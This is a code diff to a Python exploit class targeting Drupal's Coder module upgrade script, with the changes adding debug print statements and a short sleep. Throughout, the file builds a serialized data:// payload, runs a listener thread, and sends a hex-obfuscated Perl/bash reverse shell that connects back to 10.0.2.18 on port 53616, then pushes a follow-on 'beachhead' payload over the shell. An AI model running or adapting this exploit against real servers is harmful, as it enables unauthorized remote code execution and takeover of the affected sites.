@@ -2,15 +2,17 @@ from base64 import b64encode
 import requests
 import threading
 import socket
+import time
 
 
 class DrupalCoderExec:
 
-    REV_SHELL = "perl -e 'system(pack(qq,H138,,qq,62617368202D632027303C2632342D3B657865632032343C3E2F6465762F7463702F31302E302E322E31382F35333631363B7368203C263234203E26323420323E26323427,))'"
+    REV_SHELL = "perl -e 'system(pack(qq,H138,,qq,62617368202D632027303C2632342D3B657865632032343C3E2F6465762F7463702F31302E302E322E31382F35333631363B7368203C263234203E26323420323E26323427,))'\n"
     WEBSERVER_PATH = '/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php'
 
     def __init__(self, beachhead: str):
         self.beachhead = beachhead
+        print("DRUPAL: exploit instantiated")
 
     def create_payload(self, payload: str) -> str:
         p = ''
@@ -28,6 +30,7 @@ class DrupalCoderExec:
         p += ' #";s:4:"name";s:4:"test";}}}'
 
         pl = "data://text/plain;base64," + b64encode(bytes(p, 'utf-8')).decode('utf-8')
+        print("DRUPAL: Reverse shell payload created")
         return pl
     
     def send_beachhead(self, payload: str):
@@ -35,21 +38,30 @@ class DrupalCoderExec:
         PORT = 53616
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.bind((HOST, PORT))
+        print("DRUPAL: Waiting for reverse shell")
         sock.listen(1)
         conn, addr = sock.accept()
+        print("DRUPAL: Shell called home")
         conn.sendall(payload.encode('utf-8'))
-        conn.sendall(b'\r\n')
+        print("DRUPAL: Sent beachhead")
         sock.close()
 
     def exploit(self, ip_addr: str, port: str, path: str) -> requests.models.Response:
         thread = threading.Thread(target=self.send_beachhead, args=(self.beachhead,))
         thread.start()
+        print("DRUPAL: Thread started")
+        time.sleep(1)
+        print("DRUPAL: Sleep over")
         
         url = "http://" + ip_addr + ":" + port + path + self.WEBSERVER_PATH
         params = { 'file': self.create_payload(self.REV_SHELL) }
+        print("DRUPAL: Sending reverse shell")
         requests.get(url=url, params=params)
 
+        print("DRUPAL: Reverse shell sent")
         thread.join()
+        print("DRUPAL: Thread joined")
+        return
 
 
 if __name__ == "__main__":
